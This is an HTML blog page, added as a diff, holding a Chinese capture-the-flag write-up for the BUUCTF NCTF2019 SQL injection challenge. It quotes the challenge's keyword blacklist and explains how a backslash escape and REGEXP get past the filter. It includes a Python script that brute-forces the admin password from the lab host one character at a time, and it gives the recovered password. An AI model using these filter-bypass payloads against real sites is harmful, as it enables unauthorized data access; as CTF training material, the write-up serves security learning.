@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="checkline 题目明示，sqli。尝试注入，发现单引号被过滤。 目录扫描，发现robots.txt，提示hint.txt123456$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&amp;#x27;|&#x3D;| |in|&lt;|&amp;gt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露">
+<meta property="og:url" content="http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/index.html">
+<meta property="og:site_name" content="Imp1ture">
+<meta property="og:description" content="checkline 题目明示，sqli。尝试注入，发现单引号被过滤。 目录扫描，发现robots.txt，提示hint.txt123456$black_list &#x3D; &quot;&#x2F;limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&amp;#x27;|&#x3D;| |in|&lt;|&amp;gt">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/2022-06-03-17-00-29.png">
+<meta property="article:published_time" content="2022-06-03T08:06:35.000Z">
+<meta property="article:modified_time" content="2022-06-03T09:07:17.415Z">
+<meta property="article:author" content="Imp1ture">
+<meta property="article:tag" content="sqli">
+<meta property="article:tag" content="robot">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/2022-06-03-17-00-29.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/06/03/BUUCTF-Pwn-03%E9%9B%86/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/06/03/BUUCTF-WEB-RootersCTF2019-I-3-Flask-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8F%82%E6%95%B0%E7%88%86%E7%A0%B4-arjun/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&text=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&is_video=false&description=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露&body=Check out this article: http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&name=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&t=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露
+    </h1>
+
+
+
+	
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Imp1ture</span>
+      </span>
+	  <!--Leancloud 阅读量-->
+	  
+	<span id="/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/" class="leancloud-visitors" data-flag-title="BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露">
+		<em class="post-meta-item-text">阅读量</em>
+		<i class="leancloud-visitors-count">loading</i>
+	</span>
+
+
+
+	  
+	  <!--Leancloud 阅读量-->
+	  
+      
+    <div class="postdate">
+      
+        <time datetime="2022-06-03T08:06:35.000Z" itemprop="datePublished">2022-06-03</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/robot/" rel="tag">robot</a>, <a class="tag-link-link" href="/tags/sqli/" rel="tag">sqli</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="checkline"><a href="#checkline" class="headerlink" title="checkline"></a>checkline</h2><ol>
+<li>题目明示，sqli。尝试注入，发现单引号被过滤。</li>
+<li>目录扫描，发现robots.txt，提示hint.txt<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span> = <span class="string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">If <span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>] === admin<span class="string">&#x27;s password,</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then you will get the flag;</span></span><br></pre></td></tr></table></figure>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2>因为单引号被过滤，我们使用斜杠\来转移拼接<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">例如</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;test&#x27;</span></span><br><span class="line">这个时候，username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;，因为中间的单引号经转义被当作字符串的一部分。</span></span><br></pre></td></tr></table></figure>
+接着测试，发现<code>&lt; &gt; = like</code>都被过滤了，bool注入无法使用，这里使用<strong>REGEXP正则注入</strong><br>规则同常规的正则匹配<table>
+<thead>
+<tr>
+<th align="center">字符</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">.</td>
+<td align="center">匹配任意单个字符除了换行符</td>
+</tr>
+<tr>
+<td align="center">[ ]</td>
+<td align="center">[ ] 内为字符集，匹配 [ ] 内任一字符</td>
+</tr>
+<tr>
+<td align="center">[^ ]</td>
+<td align="center">匹配除了方括号里的任意字符</td>
+</tr>
+<tr>
+<td align="center">*</td>
+<td align="center">匹配 &gt;&#x3D; 0 个 * 号前的字符。</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">匹配 &gt;&#x3D; 1 个+号前的字符。</td>
+</tr>
+<tr>
+<td align="center">?</td>
+<td align="center">匹配 0 或 1 个 ？号前的字符。</td>
+</tr>
+<tr>
+<td align="center">{n,m}</td>
+<td align="center">匹配n到m个大括号之前的字符或字符集</td>
+</tr>
+<tr>
+<td align="center">(xyz)</td>
+<td align="center">匹配与 xyz 完全相等的字符串</td>
+</tr>
+<tr>
+<td align="center">|</td>
+<td align="center">或运算符，匹配</td>
+</tr>
+<tr>
+<td align="center">\s</td>
+<td align="center">匹配空格</td>
+</tr>
+<tr>
+<td align="center">\</td>
+<td align="center">转义字符,匹配一些保留的字符 [ ] ( ) { } . * + ? ^ $ \</td>
+</tr>
+<tr>
+<td align="center">^</td>
+<td align="center">从开始行开始匹配</td>
+</tr>
+<tr>
+<td align="center">$</td>
+<td align="center">从末端开始匹配</td>
+</tr>
+</tbody></table>
+</li>
+</ol>
+<p>所以我们构造</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> passwd<span class="operator">=</span><span class="string">&#x27;||passwd=/**/regexp/**/&quot;^a&quot;;%00</span></span><br><span class="line"><span class="string">解释一下</span></span><br><span class="line"><span class="string">|| 代替 or</span></span><br><span class="line"><span class="string">/**/ 代替空格</span></span><br><span class="line"><span class="string">%00 截断作用，代替注释</span></span><br><span class="line"><span class="string">^a代表以a开头，后面我们会用脚本一位位爆破</span></span><br></pre></td></tr></table></figure>
+<p>爆破脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">proxy=&#123;</span><br><span class="line">    <span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">    <span class="string">&quot;https&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">&quot;http://31946dd7-afd8-440e-b4fd-06f539591b1b.node4.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">chars = <span class="string">&#x27;_1234567890qwertyuiopasdfghjklzxcvbnm&#x27;</span></span><br><span class="line">tmp=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        payload=<span class="string">f&quot;||passwd/**/regexp/**/\&quot;^<span class="subst">&#123;tmp+char&#125;</span>\&quot;;\x00&quot;</span></span><br><span class="line">        body=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;\\&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passwd&quot;</span>:payload</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        r=requests.post(url=url,data=body,proxies=proxy)</span><br><span class="line">        <span class="built_in">print</span>(body)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;own results&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text)&amp;(<span class="string">&quot;hacker&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text): </span><br><span class="line">            <span class="comment">#print(char)</span></span><br><span class="line">            <span class="built_in">print</span>(tmp)</span><br><span class="line">            tmp+=char</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/2022-06-03-17-00-29.png"></p>
+<p>根据hint提示，直接赋值passwd&#x3D;you_will_never_know7788990，获得flag</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
+<li>sqli注释 # – 被过滤了，可以是使用%00空白符截断达到同样的的目的</li>
+<li>&lt; &gt; 这些符号被过滤了，可以是尝试使用正则匹配注入</li>
+</ol>
+
+  </div>
+</article>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/tags/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#checkline"><span class="toc-number">1.</span> <span class="toc-text">checkline</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&text=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&is_video=false&description=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露&body=Check out this article: http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&title=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&name=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/06/03/BUUCTF-WEB-NCTF2019-SQLi-%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7-robot%E6%B3%84%E9%9C%B2/&t=BUUCTF-WEB-NCTF2019-SQLi-过滤单引号-robot泄露"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2022
+    Imp1ture
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">文章</a></li><!--
+     --><!--
+       --><li><a href="/tags/">分类</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
